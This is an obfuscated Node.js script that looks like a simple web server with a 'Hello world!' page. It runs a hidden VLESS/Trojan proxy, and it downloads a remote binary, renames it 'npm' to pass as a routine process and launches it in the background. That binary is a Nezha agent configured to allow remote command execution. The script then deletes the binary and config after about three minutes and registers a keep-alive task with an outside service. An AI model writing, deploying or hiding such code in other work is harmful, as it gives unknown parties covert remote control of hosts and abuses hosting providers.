const _0x40b20f=_0x1949;(function(_0x21c80d,_0x42cdd0){const _0x250d1c=_0x1949,_0x3770b6=_0x21c80d();while(!![]){try{const _0x5085de=parseInt(_0x250d1c(0x141))/0x1*(-parseInt(_0x250d1c(0x12f))/0x2)+parseInt(_0x250d1c(0x188))/0x3*(-parseInt(_0x250d1c(0x156))/0x4)+parseInt(_0x250d1c(0x192))/0x5*(-parseInt(_0x250d1c(0x131))/0x6)+parseInt(_0x250d1c(0x17a))/0x7*(-parseInt(_0x250d1c(0x146))/0x8)+-parseInt(_0x250d1c(0x16c))/0x9+parseInt(_0x250d1c(0x142))/0xa+parseInt(_0x250d1c(0x1a0))/0xb;if(_0x5085de===_0x42cdd0)break;else _0x3770b6['push'](_0x3770b6['shift']());}catch(_0x3a2030){_0x3770b6['push'](_0x3770b6['shift']());}}}(_0x5f21,0xabb44));const os=require('os'),http=require(_0x40b20f(0x16a)),fs=require('fs'),axios=require(_0x40b20f(0x15e)),net=require(_0x40b20f(0x19d)),path=require('path'),crypto=require(_0x40b20f(0x189)),{Buffer}=require('buffer'),{exec,execSync}=require(_0x40b20f(0x16d)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env'][_0x40b20f(0x181)]||'86a686ef-ce43-4004-aa56-8d09e4e07609',NEZHA_SERVER=process[_0x40b20f(0x178)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x40b20f(0x178)][_0x40b20f(0x1a2)]||'',NEZHA_KEY=process[_0x40b20f(0x178)]['NEZHA_KEY']||'',DOMAIN=process['env'][_0x40b20f(0x133)]||_0x40b20f(0x1a3),AUTO_ACCESS=process[_0x40b20f(0x178)][_0x40b20f(0x167)]||![],WSPATH=process['env'][_0x40b20f(0x14a)]||UUID['slice'](0x0,0x8),SUB_PATH=process[_0x40b20f(0x178)][_0x40b20f(0x137)]||_0x40b20f(0x17e),NAME=process['env'][_0x40b20f(0x1a6)]||'',PORT=process['env']['PORT']||0xbb8;let ISP='';const GetISP=async()=>{const _0x2b01fd=_0x40b20f;try{const _0x162688=await axios['get']('https://speed.cloudflare.com/meta'),_0x40f569=_0x162688[_0x2b01fd(0x185)];ISP=(_0x40f569[_0x2b01fd(0x151)]+'-'+_0x40f569[_0x2b01fd(0x17b)])[_0x2b01fd(0x17d)](/ /g,'_');}catch(_0x5e3b9c){ISP='Unknown';}};GetISP();const httpServer=http[_0x40b20f(0x147)]((_0x11c0ca,_0x4c3d2f)=>{const _0x1ed78f=_0x40b20f;if(_0x11c0ca[_0x1ed78f(0x15b)]==='/'){const _0x3aa6f9=path[_0x1ed78f(0x196)](__dirname,'index.html');fs[_0x1ed78f(0x180)](_0x3aa6f9,_0x1ed78f(0x166),(_0x327e28,_0x4396ce)=>{const _0xd95478=_0x1ed78f;if(_0x327e28){_0x4c3d2f[_0xd95478(0x134)](0xc8,{'Content-Type':_0xd95478(0x193)}),_0x4c3d2f[_0xd95478(0x18e)](_0xd95478(0x183));return;}_0x4c3d2f['writeHead'](0xc8,{'Content-Type':_0xd95478(0x193)}),_0x4c3d2f[_0xd95478(0x18e)](_0x4396ce);});return;}else{if(_0x11c0ca[_0x1ed78f(0x15b)]==='/'+SUB_PATH){const _0xf327=NAME?NAME+'-'+ISP:ISP,_0x3bf1fa='vless://'+UUID+_0x1ed78f(0x162)+DOMAIN+_0x1ed78f(0x160)+DOMAIN+'&path=%2F'+WSPATH+'#'+_0xf327,_0x1a47b6=_0x1ed78f(0x199)+UUID+_0x1ed78f(0x161)+DOMAIN+_0x1ed78f(0x160)+DOMAIN+_0x1ed78f(0x184)+WSPATH+'#'+_0xf327,_0x4c77b3=_0x3bf1fa+'\x0a'+_0x1a47b6,_0xb91ca5=Buffer[_0x1ed78f(0x173)](_0x4c77b3)[_0x1ed78f(0x18f)]('base64');_0x4c3d2f[_0x1ed78f(0x134)](0xc8,{'Content-Type':_0x1ed78f(0x17c)}),_0x4c3d2f[_0x1ed78f(0x18e)](_0xb91ca5+'\x0a');}else _0x4c3d2f['writeHead'](0x194,{'Content-Type':_0x1ed78f(0x17c)}),_0x4c3d2f[_0x1ed78f(0x18e)](_0x1ed78f(0x159));}}),wss=new WebSocket[(_0x40b20f(0x13a))]({'server':httpServer}),uuid=UUID[_0x40b20f(0x17d)](/-/g,''),DNS_SERVERS=[_0x40b20f(0x1a4),'1.1.1.1'];function resolveHost(_0x56b75e){return new Promise((_0x55c1d3,_0x5e9d4d)=>{const _0x37f9a2=_0x1949;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x37f9a2(0x145)](_0x56b75e)){_0x55c1d3(_0x56b75e);return;}let _0x2a4613=0x0;function _0x3faa6d(){const _0xc49f0b=_0x37f9a2;if(_0x2a4613>=DNS_SERVERS[_0xc49f0b(0x191)]){_0x5e9d4d(new Error('Failed\x20to\x20resolve\x20'+_0x56b75e+_0xc49f0b(0x139)));return;}const _0x24651a=DNS_SERVERS[_0x2a4613];_0x2a4613++;const _0x3c512f=_0xc49f0b(0x132)+encodeURIComponent(_0x56b75e)+_0xc49f0b(0x130);axios['get'](_0x3c512f,{'timeout':0x1388,'headers':{'Accept':_0xc49f0b(0x19c)}})['then'](_0xb02085=>{const _0x1e9dd0=_0xc49f0b,_0x455c99=_0xb02085[_0x1e9dd0(0x185)];if(_0x455c99[_0x1e9dd0(0x198)]===0x0&&_0x455c99['Answer']&&_0x455c99[_0x1e9dd0(0x186)][_0x1e9dd0(0x191)]>0x0){const _0x5aed34=_0x455c99[_0x1e9dd0(0x186)]['find'](_0x2cae8f=>_0x2cae8f[_0x1e9dd0(0x12e)]===0x1);if(_0x5aed34){_0x55c1d3(_0x5aed34[_0x1e9dd0(0x185)]);return;}}_0x3faa6d();})[_0xc49f0b(0x168)](_0x307912=>{_0x3faa6d();});}_0x3faa6d();});}function handleVlessConnection(_0x1656a9,_0x572837){const _0x2315d3=_0x40b20f,[_0x3bac5c]=_0x572837,_0x5583e7=_0x572837[_0x2315d3(0x171)](0x1,0x11);if(!_0x5583e7[_0x2315d3(0x1a7)]((_0x3fae84,_0x1a4739)=>_0x3fae84==parseInt(uuid['substr'](_0x1a4739*0x2,0x2),0x10)))return![];let _0x419586=_0x572837[_0x2315d3(0x171)](0x11,0x12)[_0x2315d3(0x182)]()+0x13;const _0x45c2ae=_0x572837[_0x2315d3(0x171)](_0x419586,_0x419586+=0x2)[_0x2315d3(0x163)](0x0),_0x57ea8c=_0x572837[_0x2315d3(0x171)](_0x419586,_0x419586+=0x1)[_0x2315d3(0x182)](),_0x1b9a87=_0x57ea8c==0x1?_0x572837[_0x2315d3(0x171)](_0x419586,_0x419586+=0x4)[_0x2315d3(0x196)]('.'):_0x57ea8c==0x2?new TextDecoder()['decode'](_0x572837[_0x2315d3(0x171)](_0x419586+0x1,_0x419586+=0x1+_0x572837['slice'](_0x419586,_0x419586+0x1)['readUInt8']())):_0x57ea8c==0x3?_0x572837['slice'](_0x419586,_0x419586+=0x10)[_0x2315d3(0x15c)]((_0x249a07,_0x2b5f84,_0x5387b3,_0x4b1099)=>_0x5387b3%0x2?_0x249a07['concat'](_0x4b1099['slice'](_0x5387b3-0x1,_0x5387b3+0x1)):_0x249a07,[])[_0x2315d3(0x140)](_0x5c0468=>_0x5c0468['readUInt16BE'](0x0)[_0x2315d3(0x18f)](0x10))['join'](':'):'';_0x1656a9[_0x2315d3(0x158)](new Uint8Array([_0x3bac5c,0x0]));const _0x5f1e89=createWebSocketStream(_0x1656a9);return resolveHost(_0x1b9a87)['then'](_0xd62fec=>{const _0x3cb01f=_0x2315d3;net[_0x3cb01f(0x14e)]({'host':_0xd62fec,'port':_0x45c2ae},function(){const _0x35aea1=_0x3cb01f;this['write'](_0x572837[_0x35aea1(0x171)](_0x419586)),_0x5f1e89['on'](_0x35aea1(0x144),()=>{})['pipe'](this)['on'](_0x35aea1(0x144),()=>{})['pipe'](_0x5f1e89);})['on'](_0x3cb01f(0x144),()=>{});})[_0x2315d3(0x168)](_0x277bdd=>{const _0x55c676=_0x2315d3;net[_0x55c676(0x14e)]({'host':_0x1b9a87,'port':_0x45c2ae},function(){const _0x4c5c08=_0x55c676;this[_0x4c5c08(0x169)](_0x572837[_0x4c5c08(0x171)](_0x419586)),_0x5f1e89['on'](_0x4c5c08(0x144),()=>{})[_0x4c5c08(0x18a)](this)['on'](_0x4c5c08(0x144),()=>{})[_0x4c5c08(0x18a)](_0x5f1e89);})['on'](_0x55c676(0x144),()=>{});}),!![];}function handleTrojanConnection(_0x256478,_0x41d602){const _0x3bf2d7=_0x40b20f;try{if(_0x41d602[_0x3bf2d7(0x191)]<0x3a)return![];const _0x59ce42=_0x41d602['slice'](0x0,0x38)[_0x3bf2d7(0x18f)](),_0x16e186=[UUID];let _0xdc3eb6=null;for(const _0xbef990 of _0x16e186){const _0x1c2581=crypto[_0x3bf2d7(0x179)](_0x3bf2d7(0x175))['update'](_0xbef990)[_0x3bf2d7(0x15a)](_0x3bf2d7(0x18d));if(_0x1c2581===_0x59ce42){_0xdc3eb6=_0xbef990;break;}}if(!_0xdc3eb6)return![];let _0x45c88a=0x38;_0x41d602[_0x45c88a]===0xd&&_0x41d602[_0x45c88a+0x1]===0xa&&(_0x45c88a+=0x2);const _0x2e9cb6=_0x41d602[_0x45c88a];if(_0x2e9cb6!==0x1)return![];_0x45c88a+=0x1;const _0x2e0486=_0x41d602[_0x45c88a];_0x45c88a+=0x1;let _0x481e8d,_0x1630d8;if(_0x2e0486===0x1)_0x481e8d=_0x41d602['slice'](_0x45c88a,_0x45c88a+0x4)[_0x3bf2d7(0x196)]('.'),_0x45c88a+=0x4;else{if(_0x2e0486===0x3){const _0xa12515=_0x41d602[_0x45c88a];_0x45c88a+=0x1,_0x481e8d=_0x41d602[_0x3bf2d7(0x171)](_0x45c88a,_0x45c88a+_0xa12515)[_0x3bf2d7(0x18f)](),_0x45c88a+=_0xa12515;}else{if(_0x2e0486===0x4)_0x481e8d=_0x41d602[_0x3bf2d7(0x171)](_0x45c88a,_0x45c88a+0x10)[_0x3bf2d7(0x15c)]((_0x1bdc8b,_0x34debf,_0xc407e7,_0x25f067)=>_0xc407e7%0x2?_0x1bdc8b[_0x3bf2d7(0x12d)](_0x25f067[_0x3bf2d7(0x171)](_0xc407e7-0x1,_0xc407e7+0x1)):_0x1bdc8b,[])['map'](_0x5e8258=>_0x5e8258[_0x3bf2d7(0x163)](0x0)['toString'](0x10))[_0x3bf2d7(0x196)](':'),_0x45c88a+=0x10;else return![];}}_0x1630d8=_0x41d602['readUInt16BE'](_0x45c88a),_0x45c88a+=0x2;_0x45c88a<_0x41d602['length']&&_0x41d602[_0x45c88a]===0xd&&_0x41d602[_0x45c88a+0x1]===0xa&&(_0x45c88a+=0x2);const _0x13fe99=createWebSocketStream(_0x256478);return resolveHost(_0x481e8d)[_0x3bf2d7(0x19a)](_0xb8cd05=>{const _0x5c6d3b=_0x3bf2d7;net[_0x5c6d3b(0x14e)]({'host':_0xb8cd05,'port':_0x1630d8},function(){const _0x205cb0=_0x5c6d3b;_0x45c88a<_0x41d602['length']&&this[_0x205cb0(0x169)](_0x41d602[_0x205cb0(0x171)](_0x45c88a)),_0x13fe99['on'](_0x205cb0(0x144),()=>{})['pipe'](this)['on'](_0x205cb0(0x144),()=>{})[_0x205cb0(0x18a)](_0x13fe99);})['on'](_0x5c6d3b(0x144),()=>{});})[_0x3bf2d7(0x168)](_0x187617=>{const _0x123299=_0x3bf2d7;net[_0x123299(0x14e)]({'host':_0x481e8d,'port':_0x1630d8},function(){const _0x236333=_0x123299;_0x45c88a<_0x41d602[_0x236333(0x191)]&&this['write'](_0x41d602[_0x236333(0x171)](_0x45c88a)),_0x13fe99['on'](_0x236333(0x144),()=>{})[_0x236333(0x18a)](this)['on']('error',()=>{})['pipe'](_0x13fe99);})['on'](_0x123299(0x144),()=>{});}),!![];}catch(_0x39df9b){return![];}}wss['on'](_0x40b20f(0x152),(_0x113a25,_0x55f115)=>{const _0x578a3c=_0x40b20f,_0x26dc02=_0x55f115[_0x578a3c(0x15b)]||'';_0x113a25[_0x578a3c(0x172)](_0x578a3c(0x135),_0x1f09be=>{const _0x1cf6ca=_0x578a3c;if(_0x1f09be[_0x1cf6ca(0x191)]>0x11&&_0x1f09be[0x0]===0x0){const _0x18b098=_0x1f09be['slice'](0x1,0x11),_0x36fa65=_0x18b098[_0x1cf6ca(0x1a7)]((_0x162612,_0xb0aa98)=>_0x162612==parseInt(uuid[_0x1cf6ca(0x13c)](_0xb0aa98*0x2,0x2),0x10));if(_0x36fa65){!handleVlessConnection(_0x113a25,_0x1f09be)&&_0x113a25[_0x1cf6ca(0x197)]();return;}}!handleTrojanConnection(_0x113a25,_0x1f09be)&&_0x113a25[_0x1cf6ca(0x197)]();})['on'](_0x578a3c(0x144),()=>{});});const getDownloadUrl=()=>{const _0x3a3b07=_0x40b20f,_0x1335f7=os[_0x3a3b07(0x148)]();return _0x1335f7===_0x3a3b07(0x14c)||_0x1335f7===_0x3a3b07(0x13f)||_0x1335f7==='aarch64'?!NEZHA_PORT?_0x3a3b07(0x19b):_0x3a3b07(0x194):!NEZHA_PORT?_0x3a3b07(0x164):_0x3a3b07(0x16b);},downloadFile=async()=>{const _0xbb82a9=_0x40b20f;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x2ff0a6=getDownloadUrl(),_0x5c4d06=await axios({'method':_0xbb82a9(0x14d),'url':_0x2ff0a6,'responseType':_0xbb82a9(0x19f)}),_0x19b394=fs[_0xbb82a9(0x16e)](_0xbb82a9(0x149));return _0x5c4d06[_0xbb82a9(0x185)][_0xbb82a9(0x18a)](_0x19b394),new Promise((_0x3f230d,_0x1677bd)=>{const _0x59949b=_0xbb82a9;_0x19b394['on'](_0x59949b(0x150),()=>{const _0x28e89c=_0x59949b;console[_0x28e89c(0x157)](_0x28e89c(0x13e)),exec(_0x28e89c(0x14f),_0x3b50cb=>{if(_0x3b50cb)_0x1677bd(_0x3b50cb);_0x3f230d();});}),_0x19b394['on'](_0x59949b(0x144),_0x1677bd);});}catch(_0x241a45){throw _0x241a45;}},runnz=async()=>{const _0x5c3d3c=_0x40b20f;try{const _0x59f678=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':_0x5c3d3c(0x136)});if(_0x59f678['trim']()!==''){console[_0x5c3d3c(0x157)](_0x5c3d3c(0x13b));return;}}catch(_0x5e3ad9){}await downloadFile();let _0x3c690d='',_0xdb7457=[_0x5c3d3c(0x143),'8443',_0x5c3d3c(0x176),_0x5c3d3c(0x15f),'2083',_0x5c3d3c(0x138)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x4c8099=_0xdb7457['includes'](NEZHA_PORT)?_0x5c3d3c(0x154):'';_0x3c690d=_0x5c3d3c(0x19e)+NEZHA_SERVER+':'+NEZHA_PORT+_0x5c3d3c(0x190)+NEZHA_KEY+'\x20'+_0x4c8099+_0x5c3d3c(0x15d);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x485104=NEZHA_SERVER[_0x5c3d3c(0x195)](':')?NEZHA_SERVER['split'](':')[_0x5c3d3c(0x153)]():'',_0x3d8766=_0xdb7457[_0x5c3d3c(0x195)](_0x485104)?_0x5c3d3c(0x174):_0x5c3d3c(0x17f),_0x5ca331=_0x5c3d3c(0x170)+NEZHA_KEY+_0x5c3d3c(0x165)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x3d8766+_0x5c3d3c(0x1a8)+UUID;fs['writeFileSync']('config.yaml',_0x5ca331);}_0x3c690d='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console[_0x5c3d3c(0x157)](_0x5c3d3c(0x18c));return;}}try{exec(_0x3c690d,{'shell':_0x5c3d3c(0x177)},_0x487203=>{const _0x1c7fd6=_0x5c3d3c;if(_0x487203)console[_0x1c7fd6(0x144)]('npm\x20running\x20error:',_0x487203);else console[_0x1c7fd6(0x157)](_0x1c7fd6(0x13d));});}catch(_0x1c18a9){console[_0x5c3d3c(0x144)](_0x5c3d3c(0x14b)+_0x1c18a9);}};async function addAccessTask(){const _0x55f163=_0x40b20f;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x43e020=_0x55f163(0x1a5)+DOMAIN+'/'+SUB_PATH;try{const _0x346e80=await axios[_0x55f163(0x155)](_0x55f163(0x1a9),{'url':_0x43e020},{'headers':{'Content-Type':'application/json'}});console[_0x55f163(0x157)](_0x55f163(0x12c));}catch(_0x1623dc){}}function _0x5f21(){const _0x137773=['post','268mLoiji','log','send','Not\x20Found\x0a','digest','url','reduce','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','axios','2087','&fp=chrome&type=ws&host=','@cdns.doon.eu.org:443?security=tls&sni=','@cdns.doon.eu.org:443?encryption=none&security=tls&sni=','readUInt16BE','https://amd64.ssss.nyc.mn/v1','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','utf8','AUTO_ACCESS','catch','write','http','https://amd64.ssss.nyc.mn/agent','4309182qAxTTB','child_process','createWriteStream','Server\x20is\x20running\x20on\x20port\x20','client_secret:\x20','slice','once','from','true','sha224','2096','/bin/bash','env','createHash','137648PoKunJ','asOrganization','text/plain','replace','saikid','false','readFile','UUID','readUInt8','Hello\x20world!','&path=%2F','data','Answer','unlink','29829yQOtQd','crypto','pipe','listen','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','hex','end','toString','\x20-p\x20','length','5260oyEZwg','text/html','https://arm64.ssss.nyc.mn/agent','includes','join','close','Status','trojan://','then','https://arm64.ssss.nyc.mn/v1','application/dns-json','net','setsid\x20nohup\x20./npm\x20-s\x20','stream','38434605rJNPnq','config.yaml','NEZHA_PORT','1234.abc.com','8.8.4.4','https://','NAME','every','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','https://oooo.serv00.net/add-url','Automatic\x20Access\x20Task\x20added\x20successfully','concat','type','86sDgGqV','&type=A','858LBBIqN','https://dns.google/resolve?name=','DOMAIN','writeHead','message','utf-8','SUB_PATH','2053','\x20with\x20all\x20DNS\x20servers','Server','npm\x20is\x20already\x20running,\x20skip\x20running...','substr','npm\x20is\x20running','npm\x20download\x20successfully','arm64','map','28412iaXlYa','7685680MnkINK','443','error','test','424xFaMhV','createServer','arch','npm','WSPATH','error:\x20','arm','get','connect','chmod\x20+x\x20npm','finish','country','connection','pop','--tls'];_0x5f21=function(){return _0x137773;};return _0x5f21();}function _0x1949(_0x31bc3f,_0x3bb7f8){_0x31bc3f=_0x31bc3f-0x12c;const _0x5f21bf=_0x5f21();let _0x19497f=_0x5f21bf[_0x31bc3f];return _0x19497f;}const delFiles=()=>{const _0x312a12=_0x40b20f;fs['unlink'](_0x312a12(0x149),()=>{}),fs[_0x312a12(0x187)](_0x312a12(0x1a1),()=>{});};httpServer[_0x40b20f(0x18b)](PORT,()=>{const _0x3ebc56=_0x40b20f;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log'](_0x3ebc56(0x16f)+PORT);});
